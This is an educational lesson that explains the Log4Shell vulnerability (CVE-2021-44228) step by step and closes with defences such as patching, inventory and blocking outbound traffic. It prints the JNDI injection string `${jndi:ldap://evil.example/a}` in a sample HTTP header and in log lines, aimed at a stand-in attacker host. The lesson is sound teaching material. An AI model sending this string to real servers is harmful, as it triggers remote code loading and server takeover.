# Log4Shell (CVE-2021-44228)

`lesson` K1 · `section` K · `wave` 1 · `format` 1

## Passport

- `cwe` 502
- `owasp` A06:2021
- `attack` T1190
- `cvss` CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- `cves` CVE-2021-44228
- `severity` critical
- `impact` Running the attacker's own code on the server, and with it full control of the server
- `defence` Update the logging library and block the server's outbound connections
- `class` Remote code execution through a logging library

## Sources

- [NVD: CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance)
- [CISA AA21-356A: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [CISA: Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- [MITRE CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [MITRE CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [MITRE ATT&CK T1190: Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [OWASP Top 10:2021, A06 Vulnerable and Outdated Components](https://owasp.org/Top10/2021/A06_2021-Vulnerable_and_Outdated_Components/)
- [RFC 4511: Lightweight Directory Access Protocol (LDAP): The Protocol](https://www.rfc-editor.org/rfc/rfc4511)

## Participants

- `ldap` **Attacker's server** — evil.example · `icon:server` · `term:ldap`
- `attacker` **Attacker** — 203.0.113.66 · `term:attacker`
- `server` **Web server** — 198.51.100.10 · `term:web-server`
- `log` **Log** — Log4j library · `term:logging`

## Zones

- `evil` Attacker's network: `ldap`, `attacker` · `danger`
- `site` Shop shop.example: `server`, `log` · `term:trust-boundary`

## Steps

### `header` An odd header

`attacker → server` · `attack`
Message: GET /search · Result: accepted as a normal request

```http
GET /search?q=socks
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Simple

The attacker searches an online shop for socks. But in a service field of the request, where
the browser usually names itself, they put an **odd string** with a dollar sign and curly braces.

#### Step by step

The request looks ordinary: a search for `socks`. The odd string sits in the `User-Agent`
header. The server doesn't check it: it only needs that header for statistics.

#### Deeper

The string can go anywhere the server will later write to its log: a header, a form field, a
user name, a search query. So the attack needs neither a login nor a person's action: in the
CVSS vector that is `PR:N` and `UI:N`. The words `jndi` and `ldap` are there for a reason, which
the next steps explain.

### `write` Writing to the log

`server → log` · `attack` · `without-defence`
Message: entry: ${jndi:…} · Result: the library parses the string

```text
INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
```

#### Simple

The server dutifully writes every request to its **log**, as almost every program does. But
the logging library doesn't just write text: it looks for **lookups** of the form `${…}` in it
and carries them out.

#### Step by step

The server hands the string to the Log4j library. The library sees `${jndi:…}` and, instead of
writing it as is, sets out to find what it stands for.

#### Deeper

Lookups in Log4j exist for convenience: for example, to put the machine name or a setting's
value into an entry. The trouble is that they also fired inside the message itself, which came
from outside. Visitor data became a command for the library. NVD classifies this flaw as
CWE-917, injection into an expression language.

### `lookup` Going for an answer

`log → ldap` · `attack` · `without-defence`
Message: LDAP request: a · Result: outbound connection

```text
JNDI → ⟦ldap://evil.example/a⟧
```

#### Simple

The logging library **goes out to the internet by itself**, to the address in the string: a
server that belongs to the attacker. The site only wanted to write one line to its log.

#### Step by step

The `jndi` lookup says to ask the directory service at `evil.example` for the name `a`. The
shop's server opens an outbound connection to the attacker's server.

#### Deeper

JNDI is Java's built-in way to look objects up by name in various directories. LDAP is the
protocol of such directories (RFC 4511). JNDI speaks other protocols too: CISA advised blocking
outbound LDAP, RMI and DNS from servers. Even with no further steps, this request tells the
attacker the server is vulnerable.

### `reply` A loaded answer

`ldap → log` · `attack` · `without-defence`
Message: reply: Java object · Result: accepted

#### Simple

The attacker's server replies: "here is your object". In fact the reply carries a **program**
the attacker prepared.

#### Step by step

The directory's reply describes a Java object: where its code lives, or the object itself in
packed form. Java on the shop's server takes it to build the result of the lookup.

#### Deeper

The directory's reply was trusted by default. If it says where to load a class from, or carries
a serialized object, Java loads or unpacks it. Unpacking data sent by strangers is a separate
class of flaw, CWE-502; Apache listed it among the weaknesses of this vulnerability.

### `run` Someone else's code on the server

`server → attacker` · `attack` · `without-defence`
Message: reverse connection · Result: server under control

#### Simple

The attacker's code **runs on the shop's server** with the same rights as the site itself. For
example, it opens a door for the attacker: the server connects to them and waits for commands.

#### Step by step

The attacker gets a command line on the server. They can read the customer database, install
their own programs, move on into the internal network.

#### Deeper

This is remote code execution with no password and no human involved. That is why the base
score is 10.0 out of 10 in CVSS 3.1: a network attack, easy, with no privileges or user action,
and everything suffers: confidentiality, integrity and availability; `S:C` means the damage
reaches beyond the vulnerable library. In ATT&CK this is technique T1190, exploiting an
application exposed to the internet.

### `patched` An updated library

`server → log` · `attack` · `with-defence` · `stopped`
Message: entry: ${jndi:…} · Result: written as text, the attack failed

```text
INFO search q=socks agent=⟦${jndi:ldap://evil.example/a}⟧
```

#### Simple

The same string, but the logging library is **updated**. Now it writes the message as plain
text and goes nowhere. A trace of the attack stays in the log, and that's all.

#### Step by step

The string `${jndi:…}` lands in the log character by character. No outbound connection, no reply
from the attacker's server, no foreign code loaded.

#### Deeper

According to NVD, Log4j versions from 2.0-beta9 are affected; 2.15.0 turned lookups in messages
off by default, and from 2.16.0 (and in 2.12.2 and 2.3.1 for older Java) the feature is removed.
Related flaws were found later, and CISA recommended 2.17.1 for Java 8, 2.12.4 for Java 7 and
2.3.2 for Java 6. The library itself must be updated: updating Java doesn't help.

### `answer` A normal reply

`server → attacker` · `safe` · `with-defence`
Message: 200 OK · Result: search results

#### Simple

The attacker gets a list of socks, like any shopper. The attack failed.

#### Step by step

The server answers the search as usual. The odd header changed nothing.

#### Deeper

Even on an updated server a second line of defence helps: if the shop's server may not reach
the internet on its own, the "Going for an answer" step would break even with the old library.
And `${jndi:` strings in the log show who tried the attack and when.

## How to defend

- **Update the library.** This is the main defence: install a fixed version of Log4j, not just
  a newer Java. Internet-facing servers first.
- **Know where it is.** Log4j often arrives inside other programs and libraries. CISA advised
  making an inventory of every system with Log4j, including internal and cloud ones.
- **A stopgap if you can't update.** CISA described removing the `JndiLookup` class from the
  library. It is a patch over the hole, not a replacement for the update.
- **Block outbound connections.** The shop's server has no reason to reach the internet itself
  over LDAP, RMI or DNS. Allowed destinations go on a list.
- **Don't trust outside data.** Whatever a visitor sends is only text, even when it goes into a
  log.
- **Look for traces.** Logs of vulnerable systems contain attackers' strings: they show attempts,
  while signs of a successful break-in need checking separately.
